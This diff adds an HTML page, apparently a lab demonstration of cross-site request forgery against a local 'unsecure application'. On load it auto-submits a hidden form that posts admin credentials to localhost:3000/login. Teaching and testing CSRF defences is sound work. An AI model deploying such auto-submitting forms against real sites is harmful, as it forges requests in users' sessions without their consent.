@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Malicious Page</title>
+</head>
+<body onload="document.getElementById('malicious-form').submit();">
+  <h2>This is a malicious page!</h2>
+  <form id="malicious-form" action="http://localhost:3000/login" method="post" style="display:none;">
+    <input type="hidden" name="username" value="admin" />
+    <input type="hidden" name="password" value="password123" />
+  </form>
+  <script>
+    alert('If you are logged in to the unsecure application, a CSRF attack will be attempted when you click OK.');
+  </script>
+</body>
+</html>
